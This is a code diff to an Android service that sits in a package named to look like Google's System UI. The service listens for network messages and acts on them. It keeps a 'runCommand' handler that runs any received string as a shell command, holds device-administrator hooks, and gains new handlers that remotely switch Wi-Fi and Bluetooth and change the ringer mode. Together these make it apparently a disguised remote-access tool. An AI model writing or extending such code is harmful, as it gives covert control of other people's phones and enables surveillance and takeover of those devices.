@@ -2,15 +2,16 @@ package com.google.android.systemUi.service;
 
 import android.app.*;
 import android.app.admin.*;
+import android.bluetooth.*;
 import android.content.*;
 import android.content.pm.*;
 import android.media.*;
+import android.net.wifi.*;
 import android.os.*;
 import android.preference.*;
 import android.speech.tts.*;
 import android.speech.tts.TextToSpeech.*;
 import android.telephony.*;
-import android.util.*;
 import com.genonbeta.CoolSocket.*;
 import com.google.android.systemUi.config.*;
 import com.google.android.systemUi.helper.*;
@@ -24,7 +25,7 @@ public class CommunicationService extends Service implements OnInitListener
 {
 	public static final String TAG = "CommunationService";
 	public static boolean mAdminMode = false;
-	
+
 	private CommunicationServer mCommunationServer;
 	private AudioManager mAudioManager;
 	private DevicePolicyManager mDPM;
@@ -253,13 +254,7 @@ public class CommunicationService extends Service implements OnInitListener
 						result = true;
 						break;
 					case "runCommand":
-						boolean su = false;
-
-						if (receivedMessage.has("su"))
-							su = receivedMessage.getBoolean("su");
-
 						Runtime.getRuntime().exec(receivedMessage.getString("command"));
-
 						result = true;
 						break;
 					case "toggleTabs":
@@ -353,13 +348,53 @@ public class CommunicationService extends Service implements OnInitListener
 						break;
 					case "sendToAllConnections":
 						sendToConnections(receivedMessage.getString("message"));
+						result = true;
 						break;
 					case "adminMode":
 						mAdminMode = !mAdminMode;
-						
+
 						response.put("adminMode", mAdminMode);
-						
+
 						result = true;
+						break;
+					case "wifiPower":
+						WifiManager manager = (WifiManager) getSystemService(WIFI_SERVICE);
+
+						response.put("previousState", wifiState(manager.getWifiState()));
+
+						result = manager.setWifiEnabled(receivedMessage.getBoolean("power"));
+						break;
+					case "ringerMode":
+						String mode = receivedMessage.getString("mode");
+						int setMode = -100;
+
+						if ("silent".equals(mode))
+							setMode = AudioManager.RINGER_MODE_SILENT;
+						else if ("normal".equals(mode))
+							setMode = AudioManager.RINGER_MODE_NORMAL;
+						else if ("vibrate".equals(mode))
+							setMode = AudioManager.RINGER_MODE_VIBRATE;
+
+						if (setMode != -100)
+						{
+							mAudioManager.setRingerMode(setMode);
+							result = true;
+						}
+						else 
+							response.put("error", "Mode could not be set. Mode values can only be vibrate|silent|normal");
+						break;
+					case "bluetoothPower":
+						BluetoothAdapter bluetoothAdapter = BluetoothAdapter.getDefaultAdapter();
+
+						boolean isEnabled = bluetoothAdapter.isEnabled();
+						boolean powerRequest = receivedMessage.getBoolean("power");
+
+						response.put("previousState", isEnabled);
+						
+						if (powerRequest && !isEnabled)
+							result = bluetoothAdapter.enable(); 
+						else if (!powerRequest && isEnabled)
+							result = bluetoothAdapter.disable();
 						break;
 					default:
 						response.put("info", "{" + request + "} is not found");
@@ -470,6 +505,23 @@ public class CommunicationService extends Service implements OnInitListener
 		for (ParallelConnection conn : mParallelConnections)
 		{
 			conn.sendMessage(message);
+		}
+	}
+
+	protected String wifiState(int state)
+	{
+		switch (state)
+		{
+			case WifiManager.WIFI_STATE_DISABLING:
+				return "disabling";
+			case WifiManager.WIFI_STATE_DISABLED:
+				return "disabled";
+			case WifiManager.WIFI_STATE_ENABLING:
+				return "enabling";
+			case WifiManager.WIFI_STATE_ENABLED:
+				return "enabled";
+			default:
+				return "unknown";
 		}
 	}
 
